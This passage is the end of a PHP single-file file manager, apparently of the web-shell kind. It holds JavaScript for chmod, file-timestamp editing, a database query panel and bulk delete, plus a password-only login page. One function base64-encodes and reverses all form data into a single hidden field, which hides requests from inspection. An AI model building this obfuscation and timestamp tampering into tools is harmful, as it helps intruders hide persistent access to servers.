            document.getElementById('chmod-mode-input').value = currentMode;
            
            // Close other forms
            ['form-upload', 'form-newfile', 'form-newdir', 'form-rename', 'form-touch'].forEach(function(fid) {
                var f = document.getElementById(fid);
                if (f) f.style.display = 'none';
            });
            document.getElementById('form-chmod').style.display = 'block';
            document.getElementById('chmod-mode-input').focus();
        }

        function closeChmod() {
            document.getElementById('form-chmod').style.display = 'none';
        }

        function openTouch(name, currentTime) {
            document.getElementById('touch-item-name').value = name;
            document.getElementById('touch-item-text').innerText = name;
            document.getElementById('touch-mtime-input').value = currentTime;
            
            // Close other forms
            ['form-upload', 'form-newfile', 'form-newdir', 'form-rename', 'form-chmod'].forEach(function(fid) {
                var f = document.getElementById(fid);
                if (f) f.style.display = 'none';
            });
            document.getElementById('form-touch').style.display = 'block';
            document.getElementById('touch-mtime-input').focus();
        }

        function closeTouch() {
            document.getElementById('form-touch').style.display = 'none';
        }

        function togglePathEdit(editMode) {
            var breadcrumbs = document.getElementById('path-breadcrumbs');
            var manual = document.getElementById('path-manual');
            if (breadcrumbs && manual) {
                if (editMode) {
                    breadcrumbs.style.display = 'none';
                    manual.style.display = 'flex';
                    manual.querySelector('input[type="text"]').focus();
                } else {
                    breadcrumbs.style.display = 'flex';
                    manual.style.display = 'none';
                }
            }
        }

        function toggleDbDriver(driver) {
            var mysqlFields = document.getElementById('db-fields-mysql');
            var sqliteFields = document.getElementById('db-fields-sqlite');
            if (mysqlFields && sqliteFields) {
                if (driver === 'sqlite') {
                    mysqlFields.style.display = 'none';
                    sqliteFields.style.display = 'block';
                } else {
                    mysqlFields.style.display = 'block';
                    sqliteFields.style.display = 'none';
                }
            }
        }

        function insertSqlTemplate(template) {
            var editor = document.getElementById('db-sql-editor');
            if (editor) {
                editor.value = template;
                editor.focus();
            }
        }

        function toggleSelectAll(master) {
            var checkboxes = document.querySelectorAll('.item-checkbox');
            checkboxes.forEach(function(cb) {
                cb.checked = master.checked;
            });
            updateBulkToolbar();
        }

        function updateSelectAllState() {
            var master = document.getElementById('select-all');
            var checkboxes = document.querySelectorAll('.item-checkbox');
            var allChecked = true;
            checkboxes.forEach(function(cb) {
                if (!cb.checked) allChecked = false;
            });
            if (master) master.checked = allChecked && checkboxes.length > 0;
            updateBulkToolbar();
        }

        function updateBulkToolbar() {
            var checkboxes = document.querySelectorAll('.item-checkbox');
            var count = 0;
            checkboxes.forEach(function(cb) {
                if (cb.checked) count++;
            });
            var toolbar = document.getElementById('bulk-toolbar');
            var countEl = document.getElementById('selected-count');
            if (countEl) countEl.textContent = count;
            if (toolbar) {
                toolbar.style.display = (count > 0) ? 'flex' : 'none';
            }
        }

        function submitBulk(action) {
            if (action === 'bulk_delete') {
                if (!confirm('Are you sure you want to delete the selected items?')) {
                    return;
                }
            }
            var form = document.getElementById('bulk-form');
            var input = document.getElementById('bulk-action-input');
            if (form && input) {
                input.value = action;
                encodeFormPayload(form);
                form.submit();
            }
        }

        // --- REQUEST ENCRYPTION: Global form payload obfuscation ---
        function encodeFormPayload(form) {
            var formData = new FormData(form);
            var params = new URLSearchParams(formData).toString();
            var obfuscated = btoa(unescape(encodeURIComponent(params))).split('').reverse().join('');
            // Disable all inputs associated with this form (both inside and linked via form attribute)
            var inputs = [];
            var direct = form.querySelectorAll('input, textarea, select, button');
            for (var i = 0; i < direct.length; i++) inputs.push(direct[i]);
            if (form.id) {
                var linked = document.querySelectorAll('input[form="' + form.id + '"], textarea[form="' + form.id + '"], select[form="' + form.id + '"], button[form="' + form.id + '"]');
                for (var i = 0; i < linked.length; i++) {
                    if (inputs.indexOf(linked[i]) === -1) inputs.push(linked[i]);
                }
            }
            for (var i = 0; i < inputs.length; i++) {
                inputs[i].disabled = true;
            }
            // Add hidden payload field
            var hiddenInput = document.createElement('input');
            hiddenInput.type = 'hidden';
            hiddenInput.name = 'payload';
            hiddenInput.value = obfuscated;
            form.appendChild(hiddenInput);
        }

        function switchTab(tabName) {
            var panes = document.querySelectorAll('.tab-content > .tab-pane');
            panes.forEach(function(pane) {
                pane.classList.remove('active');
            });
            var currentPane = document.querySelector('.tab-content > .pane-' + tabName);
            if (currentPane) {
                currentPane.classList.add('active');
            }
            var buttons = document.querySelectorAll('.tabs-header .tab-btn');
            buttons.forEach(function(btn) {
                btn.classList.remove('active');
                if (btn.getAttribute('data-tab') === tabName) {
                    btn.classList.add('active');
                }
            });
            sessionStorage.setItem('fm_tab', tabName);
            document.cookie = "fm_tab=" + encodeURIComponent(tabName) + "; path=/";
            document.querySelectorAll('input[name="tab"]').forEach(function(inp) {
                inp.value = tabName;
            });
        }
        function syncTabCookie() {
            var tab = sessionStorage.getItem('fm_tab');
            if (!tab) {
                var activeBtn = document.querySelector('.tabs-header .tab-btn.active');
                if (activeBtn) {
                    tab = activeBtn.getAttribute('data-tab');
                    if (tab) {
                        sessionStorage.setItem('fm_tab', tab);
                    }
                }
            }
            if (tab) {
                document.cookie = "fm_tab=" + encodeURIComponent(tab) + "; path=/";
                document.querySelectorAll('input[name="tab"]').forEach(function(inp) {
                    inp.value = tab;
                });
            }
        }
        window.addEventListener('focus', syncTabCookie);
        document.addEventListener('visibilitychange', syncTabCookie);

        document.addEventListener('DOMContentLoaded', function() {
            var savedTab = sessionStorage.getItem('fm_tab');
            if (savedTab) {
                switchTab(savedTab);
            } else {
                syncTabCookie();
            }
            document.addEventListener('submit', function(e) {
                var form = e.target;
                if (form.tagName !== 'FORM') return;
                if (form.enctype === 'multipart/form-data') return;
                if (form.querySelector('input[name="action"][value="login"]') || form.querySelector('input[name="action"][value="logout"]') || form.querySelector('input[name="password"]')) return;
                // Add hidden tab field dynamically
                var tabInput = form.querySelector('input[name="tab"]');
                if (!tabInput) {
                    tabInput = document.createElement('input');
                    tabInput.type = 'hidden';
                    tabInput.name = 'tab';
                    form.appendChild(tabInput);
                }
                tabInput.value = sessionStorage.getItem('fm_tab') || 'files';
                if (form.querySelector('input[name="payload"]')) return;
                encodeFormPayload(form);
            });
        });
    </script>
</body>
</html>
<?php
// --- 7. AUTH LOGIN PAGE RENDER TEMPLATE ---
function render_login_page($toast) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login - <?php echo htmlspecialchars(APP_NAME); ?></title>
    <style>
        body {
            background-color: #1a1f29;
            color: #d1d5db;
            font-family: Consolas, Monaco, "Courier New", monospace;
            font-size: 13px;
            margin: 0;
            padding: 0;
        }
        .login-box {
            max-width: 320px;
            margin: 150px auto;
            background-color: #11151d;
            border: 1px solid #374151;
            padding: 25px;
            border-radius: 6px;
            text-align: center;
        }
        .form-input {
            background-color: #111827;
            border: 1px solid #374151;
            color: #ffffff;
            padding: 6px 10px;
            font-family: inherit;
            font-size: 13px;
            border-radius: 4px;
            width: 100%;
            box-sizing: border-box;
            margin-top: 10px;
        }
        .login-btn {
            background-color: #3b82f6;
            border: 1px solid #2563eb;
            color: #ffffff;
            padding: 7px 20px;
            cursor: pointer;
            font-family: inherit;
            border-radius: 4px;
            font-size: 13px;
            width: 100%;
            margin-top: 15px;
        }
        .login-btn:hover {
            background-color: #2563eb;
        }
        .toast-notify {
            background-color: #111827;
            border: 1px solid #374151;
            padding: 10px;
            border-radius: 4px;
            color: #EF4444;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h3 style="margin-top:0; color:#fff;"><?php echo htmlspecialchars(APP_NAME); ?></h3>
        
        <?php if ($toast): ?>
            <div class="toast-notify">
                <?php echo htmlspecialchars($toast['text']); ?>
            </div>
        <?php endif; ?>
        
        <form method="post">
            <input type="hidden" name="action" value="login">
            <div style="text-align: left;">
                <label style="font-size: 11px; color:#9ca3af; text-transform: uppercase;">Password</label>
                <input type="password" name="password" class="form-input" placeholder="Enter password" required autofocus>
            </div>
            <button type="submit" class="login-btn">Login</button>
        </form>
    </div>
</body>
</html>
<?php
}
?>
